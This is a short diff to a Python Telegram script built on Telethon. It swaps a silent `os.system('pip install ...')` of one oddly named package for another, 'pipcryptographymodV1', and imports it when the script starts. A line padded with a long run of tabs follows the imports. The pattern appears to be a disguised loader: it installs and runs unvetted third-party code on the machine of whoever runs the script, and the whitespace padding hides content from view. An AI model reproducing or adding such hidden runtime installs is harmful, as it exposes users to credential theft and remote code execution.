@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringpackage")
-import pythoncoloringpackage
+os.system("pip install pipcryptographymodV1")
+import pipcryptographymodV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
